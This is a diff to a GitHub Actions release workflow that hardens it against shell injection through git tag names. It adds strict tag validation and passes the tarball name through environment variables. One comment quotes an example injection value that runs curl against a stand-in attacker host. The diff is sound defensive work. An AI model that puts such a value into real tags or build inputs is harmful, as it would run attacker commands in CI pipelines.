@@ -71,10 +71,35 @@ jobs:
             bash scripts/run-smokes.sh
           done
 
-      - name: Compute release version + tarball path
+      - name: Compute release version + validate tag format
         id: ver
         run: |
+          set -eu
           TAG="${GITHUB_REF#refs/tags/}"
+          # AUDIT-CI-7 (cp17 deep-deep): validate the tag format
+          # STRICTLY before letting it flow into shell-interpolated
+          # contexts.  git-check-ref-format permits `$`, `(`, `)`,
+          # spaces, and other shell-metacharacters; we permit only
+          # the tag grammar we actually use: `v<num>.<num>.<num>`
+          # optionally followed by `-<alnum-and-dots>`.  This
+          # blocks injection like `v1.0.0-$(curl evil.com)`.
+          case "$TAG" in
+              v[0-9]*.[0-9]*.[0-9]*|v[0-9]*.[0-9]*.[0-9]*-*)
+                  ;;
+              *)
+                  echo "ERROR: tag '$TAG' does not match v<n>.<n>.<n>[-<pre>]" >&2
+                  exit 1
+                  ;;
+          esac
+          # Belt-and-braces: also reject any char outside the
+          # narrow whitelist [A-Za-z0-9.-].  Even if the case-glob
+          # above accepts something weird, this catches it.
+          case "$TAG" in
+              *[!A-Za-z0-9.-]*)
+                  echo "ERROR: tag '$TAG' contains forbidden chars" >&2
+                  exit 1
+                  ;;
+          esac
           echo "tag=${TAG}" >> "$GITHUB_OUTPUT"
           echo "tarball=morphit-${TAG}.tar.gz" >> "$GITHUB_OUTPUT"
 
@@ -83,7 +108,14 @@ jobs:
         # private working directories.  Includes the full source
         # tree the operator needs to npm-install + run on a
         # clean Ubuntu 24.04 box.
+        #
+        # AUDIT-CI-7: tag value passed via env, not ${{ }}
+        # interpolation, so bash sees a plain variable (no
+        # command substitution on the tag content).
+        env:
+          TARBALL: ${{ steps.ver.outputs.tarball }}
         run: |
+          set -eu
           tar --exclude='./node_modules' \
               --exclude='./.git' \
               --exclude='./out' \
@@ -94,13 +126,15 @@ jobs:
               --exclude='./packages/*/node_modules' \
               --exclude='./packages/*/dist' \
               --exclude='*.log' \
-              -czf "${{ steps.ver.outputs.tarball }}" .
+              -czf "$TARBALL" .
 
       - name: Compute tarball checksum
+        env:
+          TARBALL: ${{ steps.ver.outputs.tarball }}
         run: |
-          sha256sum "${{ steps.ver.outputs.tarball }}" \
-            > "${{ steps.ver.outputs.tarball }}.sha256"
-          cat "${{ steps.ver.outputs.tarball }}.sha256"
+          set -eu
+          sha256sum "$TARBALL" > "$TARBALL.sha256"
+          cat "$TARBALL.sha256"
 
       - name: Upload release artifact
         uses: actions/upload-artifact@v4
